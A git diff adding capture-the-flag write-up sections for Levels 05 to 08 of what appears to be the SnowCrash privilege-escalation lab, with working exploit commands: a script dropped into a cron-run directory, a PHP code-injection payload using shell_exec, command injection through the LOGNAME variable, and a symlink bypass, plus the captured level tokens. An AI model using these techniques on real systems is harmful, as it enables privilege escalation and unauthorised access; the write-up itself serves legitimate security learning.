@@ -257,12 +257,179 @@ Use this token as the password for `level05`.
 
 ---
 
-# Any tips for other flags :
+## Level 05
 
-## Flag05
+We discover an OpenArena server running with `flag05` permissions. Inspecting the binary at `usr/sbin/openarenaserver/` script:
+
+```sh
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
 ```
-find a user flag05 owning openarenaserver in /usr/sbin
+
+### Vulnerability
+
+This script automatically executes every file in `/opt/openarenaserver/` with a 5-second timeout, then deletes it. It runs with `flag05` permissions via cron.
+
+### Exploitation
+
+1. Create a malicious shell script in `/tmp`:
+
+```bash
+cat > /tmp/solve.sh << 'EOF'
+#!/bin/sh
+getflag > /tmp/out
+EOF
+
+chmod +x /tmp/solve.sh
 ```
+
+2. Place it in the OpenArena directory:
+
+```bash
+cp /tmp/solve.sh /opt/openarenaserver/
+```
+
+3. The cron job will automatically execute it with `flag05` permissions. The output file will contain the flag:
+
+```bash
+cat /tmp/out
+```
+
+Token obtained:
+
+```text
+viuaaale9huek52boumoomioc
+```
+
+Use this token as the password for `level06`.
+
+---
+
+## Level 06
+
+We have `level06` and `level06.php`. When we cat `level06.php`, we see a shebang first, then a function that executes parameters.
+
+### Vulnerability
+
+Trying to run it directly with this payload is rejected by the shell:
+
+```bash
+./level06 [x {${shell_exec(getflag)}}]
+```
+
+So instead, put the payload in a file under `/tmp` and pass the file as an argument.
+
+### Exploitation
+
+1. Create a file in `/tmp` containing the payload:
+
+```bash
+echo '[x {${shell_exec(getflag)}}]' > /tmp/level06
+```
+
+2. Run the binary using that file as the parameter:
+
+```bash
+./level06 /tmp/level06
+```
+
+3. The script evaluates the injected PHP and returns the token.
+
+Token obtained:
+
+```text
+wiok45aaoguiboiki2tuin6ub
+```
+
+Use this token as the password for `level07`.
+
+---
+
+## Level 07
+
+We have a `level07` binary. Using `strings level07`, we can see it reads environment values and uses `LOGNAME`.
+
+When we execute it normally, it prints `level07`, so we assume it prints/interprets the `LOGNAME` value.
+
+### Exploitation
+
+Inject command substitution through `LOGNAME`:
+
+```bash
+export LOGNAME='$(getflag)'
+./level07
+```
+
+It executes perfectly and returns the token.
+
+Token obtained:
+
+```text
+fiumuikeil55xe9cu4dood66h
+```
+
+Use this token as the password for `level08`.
+
+---
+
+## Level 08
+
+We have a `level09` executable and a file named `token`. Using `strings level08`, we can see that it is a `.c` file that takes an fd as an argument.
+
+When we try:
+
+```bash
+./level08 token
+```
+
+it says that we don't have permission.
+
+### Vulnerability
+
+The program does not use `access()`, `realpath()`, or any other path validation. That means the check is likely hardcoded against the literal filename `token`.
+
+### Exploitation
+
+Create a symlink whose name does not contain the word `token`, pointing to the real file:
+
+```bash
+ln -s /home/user/level08/token /tmp/fake_file
+```
+
+Then run the binary with the symlink:
+
+```bash
+./level08 /tmp/fake_file
+```
+
+This gives us the token:
+
+```text
+quif5eloekouj29ke0vouxean
+```
+
+Then switch user and get the final flag:
+
+```bash
+su flag08
+getflag
+```
+
+Flag obtained:
+
+```text
+25749xKZ8L7DkSCwJkT9dyv6f
+```
+
+Use this flag/token as the password for `level09`.
+
+---
+
+# Any tips for other flags :
 
 ## /etc
 found
